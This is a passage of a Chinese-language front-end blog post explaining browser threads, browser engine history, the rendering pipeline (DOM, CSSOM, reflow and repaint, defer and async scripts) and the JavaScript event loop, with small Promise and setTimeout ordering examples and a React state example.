JS引擎线程</h5><ul><li>也成为JS内核，负责处理Javascript脚本程序（如V8引擎）</li><li>JS引擎线程负责解析Javascript脚本，运行代码</li><li>JS引擎一直等待着任务队列中任务的到来，然后加以处理。</li><li>GUI渲染线程与JS引擎线程是互斥的，如果JS执行的时间过长，就会造成页面的渲染不连贯，导致页面渲染加载阻塞。</li></ul><h5 id="2-1-3-事件触发线程"><a href="#2-1-3-事件触发线程" class="headerlink" title="2.1.3 事件触发线程"></a>2.1.3 事件触发线程</h5><ul><li>当JS引擎执行代码块如setTimeOut，绑定鼠标点击，ajax异步请求，会将对应任务添加到事件线程中。</li><li>当对应的事件触发条件被触发时，该线程会把时间添加到待处理队列的队尾，等待JS引擎的处理</li><li>由于JS的单线程关系，这些待处理队列中的事件，只在JS引擎空闲时才会去执行</li></ul><h5 id="2-1-4-定时触发器线程"><a href="#2-1-4-定时触发器线程" class="headerlink" title="2.1.4 定时触发器线程"></a>2.1.4 定时触发器线程</h5><ul><li><em><code>setInterval</code></em>与<em><code>setTimeout</code></em>所在线程</li><li>浏览器定时计数器不是由JS引擎计数的（因为Javascript引擎是单线程的，如果处于阻塞线程状态，计时将不准确）</li><li>因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲时执行）</li></ul><h5 id="2-1-5-异步http请求线程"><a href="#2-1-5-异步http请求线程" class="headerlink" title="2.1.5 异步http请求线程"></a>2.1.5 异步http请求线程</h5><ul><li>发起XMLHttpRequest连接后，浏览器会新开一个线程处理请求<br>（一个http一个线程？）</li><li>在检测到状态变更时，如果设置有回调函数，异步线程就会产生状态变更事件，将这个回调再放入事件队列中。由JS引擎执行。</li></ul><p><br></p><h4 id="2-2-常见浏览器内核"><a href="#2-2-常见浏览器内核" class="headerlink" title="2.2 常见浏览器内核"></a>2.2 常见浏览器内核</h4><p>浏览器渲染进程，指的就是我们平时所说的浏览器内核。浏览器内核可以分为两部分： 渲染引擎和JS引擎。<em>渲染引擎</em>负责取得网页的内容（HTML, XML, 图像等等）、整理讯息（加入CSS）, 以及计算网页的显示方式，然后输出至显示器或打印机。<em>JS引擎</em>，则是解析和执行javascript。</p><p>最开始渲染引擎和JS引擎没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎。常见的浏览器内核：Trident（IE内核），</p><p><em>1. Trident(IE内核)</em><br>IE内核在1997年的IE4中首次被采用，是微软在Mosaic(人类第一个浏览器)代码基础上修改而来的，并沿用到IE11。IE内核曾经几乎与W3C标准脱节（2005年），内核中大量bug等安全性问题也没有得到及时解决。国内很多双核浏览器的其中一核便是Trident,美其名曰“兼容模式”。Window10发布后，IE将其内置浏览器命名为Edge, Edge最显著的特点就是新内核EdgeHTML。</p><p><em>2. Gecko（Firefox）</em><br>Netscape6, Mozilla Firefox也采用了该内核。Gecko引擎与IE不无关系，IE没有使用W3C标准，导致了微软内部一些开发人员的不满，他们与当时已经停止更新了的Netscape的一些员工，一起创办了Mozilla。</p><p><em>3. Webkit（Safari）</em><br>当年苹果在比较了Gecko和KHTML后，选择了后者来做引擎开发，是因为KHTML拥有清晰的源码结构和极快的渲染速度。Webkit内核 可以说是以硬件盈利为主的苹果公司给软件行业的最大贡献之一。随后，2008年谷歌公司发布Chorme浏览器，采用的chromium内核就是fork了Webkit</p><p><em>4. Chromium/Blink（Chrome）</em><br>2008年，谷歌公司发布了chrome浏览器，浏览器使用的内核被命名为chromium。choromium fork字开源引擎webkit。谷歌公司还研发了自己的javascript引擎，V8,极大地提高了javascript的运算速度。chromium问世后，一些基于chromium的单核，双核浏览器拔地而起，如搜狗、360、qq浏览器。2013年，谷歌发表将于webkit分道扬镳，在chromium项目中研发Blink渲染引擎，内置于Chorme浏览器中。</p><p><em>5. 移动端内置浏览器内核</em><br>目前移动设备浏览器上常用的内核有Webkit, Blink, Trident, Gecko等。其中iphone和iPad等ios平台主要是webkit, Android 4.4之前安卓系统浏览器内核是webkit， android系统浏览器切换到chromium。Window Phone 8系统浏览器内核是Trident。</p><p><br><br><br></p><h3 id="3-解析URL"><a href="#3-解析URL" class="headerlink" title="3. 解析URL"></a>3. 解析URL</h3><p>当操作系统GUI将输入事件传递到了浏览器，在这过程中，浏览器可能会做一些预处理，比如Chrome会根据历史统计来预估输入字符对应的网站。比如输入了<code>[ba]</code>,根据之前的历史发现90%的概率会访问<code>[www.baidu.com]</code>，因此就会在输入回车前开始建立TCP链接甚至渲染了。</p><p>输入URL后的[回车]，这时浏览器会进行检查，首先判断协议，如果是http就按照web来处理，调用浏览器内核中的对应方法，如WebView中的loadUrl方法。从应用角度看，主要做两件事件：通过DNS查询IP，通过Socket发送数据。<em>每个网络请求时都需要开辟单独的线程进行。</em></p><p><br><br><img src="/2019/06/13/浏览器/2.png" style="max-width:500px"></p><h3 id="4-浏览器渲染页面"><a href="#4-浏览器渲染页面" class="headerlink" title="4. 浏览器渲染页面"></a>4. 浏览器渲染页面</h3><p>从耗时的角度，浏览器请求、加载、渲染一个页面，时间花在下面五件事件上：</p><ul><li>DNS查询</li><li>TCP连接</li><li>HTTP请求</li><li>服务器响应</li><li>客户端渲染</li></ul><p>浏览器对内容的渲染（渲染树构建、布局及绘制），又可以分为下面几个步骤：</p><ul><li>解析HTML，构建DOM树</li><li>解析CSS，生成CSS规则树</li><li>合并DOM树和CSS规则树，生成render树</li><li>布局render树（Layout/reflow），负责各元素尺寸、位置的计算</li><li>绘制render树（paint）,绘制页面像素信息</li><li>浏览器会将各层的信息发送给GPU, GPU会将各层合成（composite）,显示在屏幕上</li></ul><p><img src="/2019/06/13/浏览器/3.png"></p><p>如果DOM或CSSDOM被修改，上面的过程需要重复执行，才能计算出哪些像素需要在屏幕上重新渲染。实际上，CSS与javascript往往会多次修改DOM和CSSDOM。</p><p><br></p><h4 id="4-1-DOM树"><a href="#4-1-DOM树" class="headerlink" title="4.1 DOM树"></a>4.1 DOM树</h4><p>假设拿到了这样的页面：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Critical Path<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">span</span>&gt;</span>web performance<span class="tag">&lt;/<span class="name">span</span>&gt;</span> students!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"awesome-photo.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>解析HTML，构建出DOM的过程可以简述如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes → characters → tokens → nodes → DOM</span><br></pre></td></tr></table></figure></p><p><em>转换</em>：浏览器先将获得的HTML内容(Bytes)基于指定的编码转换为单个字符。<br><em>分词</em>：按照HTML规范将这些字符转换为不同的标记token。每个token都有自己独特的含义以及规则集。<br><em>词法分析</em>：分词的结果是得到一堆的token，此时把他们转换为对象，这些对象分别有它们对应的属性和规则<br><em>DOM构建</em>：根据标签之间的贵溪，最终得到一个树形结构的DOM树。</p><p><img src="/2019/06/13/浏览器/4.png"></p><p><br></p><h4 id="4-2-CSS规则树"><a href="#4-2-CSS规则树" class="headerlink" title="4.2 CSS规则树"></a>4.2 CSS规则树</h4><p>CSS规则树的生成也是类似<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes -&gt; characters -&gt; tokens -&gt; nodes -&gt; CSSDOM</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-Render树"><a href="#4-3-Render树" class="headerlink" title="4.3 Render树"></a>4.3 Render树</h4><p>当DOM树和CSSDOM树都有了后，就要构建渲染树了。一般来说，渲染树和DOM树相对应，但不是严格意义上的一一对应，因为有一些不可见的DOM元素不会插入到渲染树中。如<code>display：none</code>的元素，和<code>&lt;head&gt;</code>这样的不可见标签。<br><br><br><img src="/2019/06/13/浏览器/5.png"></p><p><br><br><br></p><h4 id="4-4-渲染"><a href="#4-4-渲染" class="headerlink" title="4.4 渲染"></a>4.4 渲染</h4><p>有了render树，接下来就是渲染，主要有4个步骤:</p><ul><li>计算CSS样式</li><li>构建渲染树</li><li>布局，主要定位坐标的大小，是否换行，各种position overflow z-index属性</li><li>绘制，将图像绘制出来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Render Tree -&gt; Compute style -&gt; construct frames -&gt; layout -&gt; paint</span><br></pre></td></tr></table></figure></li></ul><p>js动态修改dom或css，会导致重新布局(Layout)或渲染(Repaint)。</p><p><br></p><h5 id="4-4-1-回流"><a href="#4-4-1-回流" class="headerlink" title="4.4.1 回流"></a>4.4.1 回流</h5><p>Layout，也称为Reflow, 回流。意味着元素的内容、结构、位置或尺寸发生了变化，需要重新计算样式和渲染树。</p><ul><li>页面渲染初始化</li><li>DOM结构改变，如删除了某个几点</li><li>render树变化，如减少了padding</li><li>窗口resize</li><li>获取某些属性也会触发回流：offset(Top/Left/Width/Height), scroll(Top/Left/Width/Height), client(Top/Left/Width/Height), width, height, 调用getComputedStyle</li></ul><p><br></p><h5 id="4-4-2-重绘"><a href="#4-4-2-重绘" class="headerlink" title="4.4.2 重绘"></a>4.4.2 重绘</h5><p>Repaint，即重绘。意味着只有一些外观属性发生了变化（例如，背景色，边框颜色，文字颜色），此时只需要应用新样式绘制这个元素就可以了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">document</span>.body.style;</span><br><span class="line">s.padding = <span class="string">"2px"</span>;            <span class="comment">// 回流+ 重绘</span></span><br><span class="line">s.border = <span class="string">"1px solid red"</span>;   <span class="comment">// 再一次 回流+重绘</span></span><br><span class="line">s.color = <span class="string">"blue"</span>;             <span class="comment">// 再一次 重绘</span></span><br><span class="line">s.backgroundColor = <span class="string">"#ccc"</span>;   <span class="comment">// 再一次 重绘</span></span><br><span class="line">s.fontSize = <span class="string">"14px"</span>;          <span class="comment">// 再一次 回流+重绘</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChld(<span class="built_in">document</span>.createTextNode(<span class="string">'abc!'</span>));  <span class="comment">// 再一次 回流+重绘</span></span><br></pre></td></tr></table></figure><p><br></p><h5 id="4-4-3-避免回流"><a href="#4-4-3-避免回流" class="headerlink" title="4.4.3 避免回流"></a>4.4.3 避免回流</h5><p>回流的成本开销要高于重绘，一个节点的回流往往导致子节点以及同级节点的回流，尽量避免回流一般有这些优化方案：</p><ul><li>减少逐项更改样式，一次性修改style，或将样式已定义为class一次性更新</li><li>避免循环操作dom，创建一个documentFragment或div,在上面应用所有dom后，再添加到window.document</li><li>避免多次读取offset属性，缓存到变量</li><li>复杂的元素用绝对定位或固定定位，使得它脱离文档流，否则回流代价会很高</li></ul><p><br></p><h4 id="4-5-资源外链下载"><a href="#4-5-资源外链下载" class="headerlink" title="4.5 资源外链下载"></a>4.5 资源外链下载</h4><p>当html解析器被脚本阻塞时，解析器虽然会停止构建DOM，但仍会识别该脚本后面的资源，并进行预加载。它们包括CSS样式资源，JS脚本资源，img图片资源。遇到这些外链时，会单独开启一个下载线程去下载资源。</p><p><em>css样式资源</em></p><ul><li>css下载时异步，不会阻塞浏览器构建dom树</li><li>css被视为阻塞渲染的资源，浏览器将不会渲染任何已处理的内容，知道CSSDOM构建完毕</li><li>media query声明的css不会阻塞渲染，会在符合条件时阻塞渲染</li></ul><p><em>js脚本资源</em></p><ul><li>当浏览器遇到一个script标签时，DOM构建将暂停，直至脚本完成执行</li><li>在脚本阻塞时，也会继续下载其他资源，但解析过程仍然是阻塞的</li><li>defer: 延迟执行引入的js，即这段js加载时html并未停止解析，这两个过程是并行的。整个document解析完毕而且defer-script也加载完成之后，会执行所有由defer-script加载的js代码，然后触发DOMContentLoaded事件。</li><li>async: 异步执行引入的js，async-script可能在DOMContentLoaded触发之前或之后执行，但一定在load触发之前执行。多个async-script的执行顺序是不确定的。<strong>注意：向document动态添加script标签时，async属性默认是true</strong>。如果想同步执行，需要把async属性人为设置为false。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span> <span class="attr">defer</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span> <span class="attr">async</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><em>img图片资源</em><br>遇到图片资源时，直接会异步下载，不会阻塞解析，下载完后直接用图片替换原有src的地方</p><p><br></p><h3 id="4-JS引擎解析"><a href="#4-JS引擎解析" class="headerlink" title="4. JS引擎解析"></a>4. JS引擎解析</h3><p>作为浏览器脚本语言，javascript的主要用途是与用户交互，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？为了避免复杂性，<em>Javascript就是单线程</em>。</p><p>一个Javascript引擎会常驻与内存中，它等待宿主(浏览器/node)把js代码传递给它执行。浏览器还会给javascript引擎提供像setTimeout这样的API，它允许javascript在特定的时机执行。在ES3前，js本身还没有异步执行代码的能力。但在es5之后，js引入了Promise，这样，不用浏览器的安排，js引擎本身也可以发起任务。<br><br></p><h4 id="4-1-Event-Loop"><a href="#4-1-Event-Loop" class="headerlink" title="4.1 Event Loop"></a>4.1 Event Loop</h4><p>单线程就意味着，所有任务都需要排队，前一个任务结束，才会执行后一个任务。但是很多时候CPU是闲着的，因为IO设备很慢（如ajax从网络读取数据），不得不等着结果出来，再往下执行。Javascript的设计者意识到，这时主线程完全可以不管IO设备，挂起等待中的任务，先运行排在后面的任务。等IO返回了结果，再回过头，把挂起的任务继续执行下去。</p><p>于是，所有任务可以分成两种，同步任务和异步任务。<em>同步任务</em>指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；<em>异步任务</em>指的是，不进去主线程，而进入任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，改任务才会进入主线程执行。</p><p>Event Loop的运行机制:</p><ul><li>所有同步任务都在主线程上执行，形成一个执行栈</li><li>主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列中放置一个事件。</li><li>一旦“执行栈”中的所有同步任务执行完毕，系统就会读取“任务队列”，看看里面有哪些事件。这些事件，可以结束等待状态，进入执行栈，开始执行。</li><li>主线程不断重复上面步骤</li></ul><p>只要主线程空了，就会去读取“任务队列”，这个运行机制被称为<em>Event Loop</em></p><p>主线程运行的时候，产生堆(heap)和栈(stack)，栈中的代码调用各种外部API，它们在“任务队列”中加入各种事情(click, load, done)。只要栈中的代码执行完毕，主线程就会去读“任务队列”，依次执行那些事件对应的回调函数。</p><p><img src="/2019/06/13/浏览器/7.png"></p><p><br></p><h4 id="4-2-宏观任务"><a href="#4-2-宏观任务" class="headerlink" title="4.2 宏观任务"></a>4.2 宏观任务</h4><p>我们把宿主发起的任务成为<strong>宏观任务</strong>，把js引擎发起的任务成为<strong>微观任务</strong>。</p><p>宏观任务的队列相当于事件循环。在宏观任务中，javascript的Promise还会产生异步代码，js会保证这些异步代码在一个宏观任务中完成，因此宏观任务中又包含了一个微观任务队列，机制如下：</p><ul><li>执行一个宏任务（栈中没有就从事件队列中获取）</li><li>执行过程中如果遇到微任务，就将它添加到微任务的任务队列中</li><li>宏任务执行完毕后，立即执行当前微任务队列中的所有微任务（依次执行）</li><li>当前宏任务执行完毕，开始检查渲染，然后GUI线程接管渲染</li><li>渲染完毕后，js线程继续接管，开始下一个宏任务</li></ul><p><img src="/2019/06/13/浏览器/8.png" style="max-width:300px"></p><p>宏观任务有：</p><ul><li>setTimeout,setInterval</li><li>requestAnimationFrame</li><li>解析HTML</li><li>执行主线程js代码</li><li>修改url</li><li>页面加载，UI渲染</li><li>用户交互</li></ul><p><em>问题： 怎样确定一个函数在dom更新后执行？</em></p><p><br></p><h4 id="4-2-微观任务"><a href="#4-2-微观任务" class="headerlink" title="4.2 微观任务"></a>4.2 微观任务</h4><p>Promise是js语言提供的一种标准化的异步管理方式。Promise永远在队列尾部添加微观任务，setTimeout等宿主API,则会添加宏观任务。</p><p>微观任务有: </p><ul><li>process.nextTick</li><li>Object.observer</li><li>MutationObserver</li><li>Promise</li></ul><p>Promise的resolve始终是异步操作，所以c无法出现在b之前<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">  resolve()</span><br><span class="line">&#125;)</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c</span></span><br></pre></td></tr></table></figure></p><p>Promise产生的是Javascript引擎内部的微任务，而setTimeout是浏览器API，它产生宏任务。微任务始终先于宏任务。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">  resolve()</span><br><span class="line">&#125;);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'d'</span>), <span class="number">0</span>);</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c d</span></span><br></pre></td></tr></table></figure></p><p>执行一个耗时1s的Promise，确保了任务b是在d之后被添加到任务队列。即使耗时一秒的c执行完毕，才执行b，它们仍然先于d执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'d'</span>), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  resolve();</span><br><span class="line">&#125;)</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> begin = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">Date</span>.now() - begin &lt; <span class="number">1000</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'c'</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">      resolve()</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'b'</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// c b d</span></span><br></pre></td></tr></table></figure></p><p>第一个宏观任务中，执行了a,b。setTimeout后，第二个宏观任务执行resolve，then中的异步代码得到执行，输出了c<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">duration</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line">    setTimeout(resolve, duration)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">sleep(<span class="number">500</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c</span></span><br></pre></td></tr></table></figure></p><h4 id="4-3-开发中碰到的问题"><a href="#4-3-开发中碰到的问题" class="headerlink" title="4.3 开发中碰到的问题"></a>4.3 开发中碰到的问题</h4><p>开发中碰到的问题<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    form: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  addFormData(obj) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; form &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    form = <span class="built_in">Object</span>.assign(form, obj)</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; form &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;Step1 addFormData=&#123;<span class="keyword">this</span>.addFormData.bind(<span class="keyword">this</span>)&#125; /&gt;</span><br><span class="line">        &lt;Step2 addFormData=&#123;<span class="keyword">this</span>.addFormData.bind(<span class="keyword">this</span>)&#125; /&gt;</span><br><span class="line">        &lt;Step3 addFormData=&#123;<span class="keyword">this</span>.addFormData.bind(<span class="keyword">this</span>)&#125; form=&#123;<span class="keyword">this</span>.state.form&#125; /&gt;</span><br><span class="line">        &lt;Result /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">class Step3 extends React.Component&#123;</span></span><br><span class="line"><span class="regexp">  handleSubmit()&#123;</span></span><br><span class="line"><span class="regexp">    this.props.addFormData(&#123;'a':1&#125;);</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取this.props.form提交表单</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 这时,Parent中的form已经更新了，但是DOM还没更新完，值还没被传到&lt;Step3 /</span>&gt;中</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.props.form)  <span class="comment">// &#123;&#125;</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.props.form)  <span class="comment">// &#123;'a':1&#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5a6547d0f265da3e283a1df7" target="_blank" rel="noopener">从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理</a></li><li><a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制</a></li><li><a href="http://fex.baidu.com/blog/2014/05/what-happen/" target="_blank" rel="noopener">FEX 从输入 URL 到页面加载完成的过程中都发生了什么事情？</a></li><li><a href="https://juejin.im/entry/57ff3cea0e3dd90057e5f25e" target="_blank" rel="noopener">主流浏览器内核介绍（前端开发值得了解的浏览器内核历史）</a></li><li><a href="https://hllvm-group.iteye.com/group/topic/37596" target="_blank" rel="noopener">各JavaScript引擎的简介，及相关资料/博客收集帖</a></li><li><a href="https://juejin.im/entry/59e1d31f51882578c3411c77" target="_blank" rel="noopener">浏览器的渲染：过程与原理</a></li><li><a href="http://www.dailichun.com/2018/03/12/whenyouenteraurl.html" target="_blank" rel="noopener">从输入URL到页面加载的过程？如何由一道题完善自己的前端知识体系！</a></li><li><a href="https://juejin.im/entry/59e1d31f51882578c3411c77" target="_blank" rel="noopener">浏览器的渲染：过程与原理</a></li><li><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">JavaScript 运行机制详解：再谈Event Loop</a></li><li><a href="https://juejin.im/post/5c41b37de51d45527201a87f" target="_blank" rel="noopener">我尤其想理清楚javaScript的执行机制</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>模块化：CommonJS, AMD, CMD, ES6</title>
      <link href="/2019/06/11/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
      <url>/2019/06/11/%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
